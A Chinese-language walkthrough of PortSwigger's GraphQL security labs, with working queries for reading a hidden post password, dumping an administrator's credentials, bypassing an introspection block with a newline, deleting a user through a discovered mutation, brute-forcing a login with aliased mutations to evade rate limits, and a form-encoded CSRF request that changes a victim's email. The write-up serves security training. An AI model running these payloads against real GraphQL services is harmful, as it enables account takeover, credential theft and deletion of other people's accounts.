
## 发现模式信息

实验：访问私有 GraphQL 帖子
https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

主页加载了似乎为gql的脚本
```html
<script src="/resources/js/gqlUtil.js"></script>
<script src="/resources/js/blogSummaryGql.js"></script>
```
其中包含了结构信息
端点位置为
/graphql/v1

对博客文章的查询中
```
query getBlogSummaries {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}
```
响应缺乏 id=3 的文章，此时仍缺乏全部字段信息
使用burp的gql查询内省功能

将查询响应复制到文章教程的工具中解析
http://nathanrandal.com/graphql-visualizer/
在
BlogPost
发现似乎为敏感字段的
postPassword: String

应用程序使用的查询为
```
query getBlogPost($id: Int!) {
    getBlogPost(id: $id) {
        image
        title
        author
        date
        paragraphs
    }
}

{"id":5}
```

修改或创建查询为
```
query getBlogPost($id: Int!) {
    getBlogPost(id: $id) {
        postPassword
    }
}

{"id":3}
```

响应为
```json
{
  "data": {
    "getBlogPost": {
      "postPassword": "ixuun4v403b6od90trw5zs9pmvs6wm2u"
    }
  }
}
```



实验：意外暴露私有 GraphQL 字段
https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure

端点为
/graphql/v1

使用自省查询后分析结构
query
getUser(id:Int!): User
获取用户名与密码
User
id: Int!
username: String!
password: String!


修改或创建查询为
```
query getUser($id: Int!) {
    getUser(id: $id) {
        username
        password
    }
}

{"id":1}
```
响应为
```json
{
  "data": {
    "getUser": {
      "username": "administrator",
      "password": "cyctr0zemoolrkpcmx5h"
    }
  }
}
```

## 绕过 GraphQL 内省防御


浏览中无显式gql
对标准端点进行测试，其中
GET /api HTTP/2
响应为
"Query not present"
而post禁用

修改并发送
/api?query=
此时重复器的gql面板启用
使用burp的内省查询，此处为url查询字符串的形式

响应为
"GraphQL introspection is not allowed, but the query contained __schema or __type"

此处保留最少内容尝试进行绕过
```
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
    }
}
```

在 __schema 后添加换行得到查询
```
query IntrospectionQuery {
    __schema
    {
        queryType {
            name
        }
    }
}
```

修改内省查询后得到
```json
{
    "kind": "INPUT_OBJECT",
    "name": "DeleteOrganizationUserInput",
    "description": null,
    "fields": null,
    "inputFields": [
    {
        "name": "id",
        "description": null,
        "type": {
        "kind": "NON_NULL",
        "name": null,
        "ofType": {
            "kind": "SCALAR",
            "name": "Int",
            "ofType": null
        }
        },
        "defaultValue": null
    }
    ],
    "interfaces": null,
    "enumValues": null,
    "possibleTypes": null
}

{
    "kind": "OBJECT",
    "name": "DeleteOrganizationUserResponse",
    "description": null,
    "fields": [
    {
        "name": "user",
        "description": null,
        "args": [],
        "type": {
        "kind": "NON_NULL",
        "name": null,
        "ofType": {
            "kind": "OBJECT",
            "name": "User",
            "ofType": null
        }
        },
        "isDeprecated": false,
        "deprecationReason": null
    }
    ],
    "inputFields": null,
    "interfaces": [],
    "enumValues": null,
    "possibleTypes": null
}

{
    "kind": "OBJECT",
    "name": "mutation",
    "description": null,
    "fields": [
    {
        "name": "deleteOrganizationUser",
        "description": null,
        "args": [
        {
            "name": "input",
            "description": null,
            "type": {
            "kind": "INPUT_OBJECT",
            "name": "DeleteOrganizationUserInput",
            "ofType": null
            },
            "defaultValue": null
        }
        ],
        "type": {
        "kind": "OBJECT",
        "name": "DeleteOrganizationUserResponse",
        "ofType": null
        },
        "isDeprecated": false,
        "deprecationReason": null
    }
    ],
    "inputFields": null,
    "interfaces": [],
    "enumValues": null,
    "possibleTypes": null
}
```
三个对象分别对应删除功能的输入，响应，操作
此处使用删除功能时，需用户id
使用发现的查询功能，根据用户名获取id
query
getUser(id:Int!): User

User
id: Int!
username: String!

构建查询用户名与id的gql
```
query mygetUser($id:Int!) {
  getUser(id:$id) {
	username
  }
}
{"id":3}
```
响应的用户名为目标用户


构建使用id删除账户的gql
```
mutation deleteOrganizationUser($input: DeleteOrganizationUserInput!) {
  deleteOrganizationUser(input: $input) {
    user {
        username
    }
  }
}

{
  "input": {
    "id": 3
  }
}
```

## 使用别名绕过速率限制

实验：绕过 GraphQL 暴力破解防护
https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass

修改普通查询
```
mutation login($input: LoginInput!) {
    login(input: $input) {
        token
        success
    }
}
{"input":{"username":"a","password":"a"}}
```
为暴力破解查询，暴力破解查询使用内联。
使用提示中创建的脚本得到内联格式的gql字符串

使用变量时的json格式对象修改为qgl格式，即字段无双引号
即，从
{"input":{"username":"a","password":"a"}}
到
{username:"a",password:"a"}

```
mutation login {
    bf1: login(input: {username:"carlos",password:"···"}) {
        token
        success
    }
    bf2: login(input: {username:"carlos",password:"···"}) {
        token
        success
    }
    ···
}
```


## GraphQL CSRF

实验：在 GraphQL 上执行 CSRF 攻击
https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api


修改邮件的最简查询为
mutation changeEmail{changeEmail(input:{email:"z@z"}){email}}
尝试创建表单post体为
query=&operationName=

在重复器中测试
Content-Type: application/x-www-form-urlencoded

query=mutation+changeEmail{changeEmail(input%3a{email%3a"gg%40ggz"}){email}}&operationName=changeEmail


生成CSRF概念验证，复制拥有自动提交功能的表单的HTML代码到控制页面

















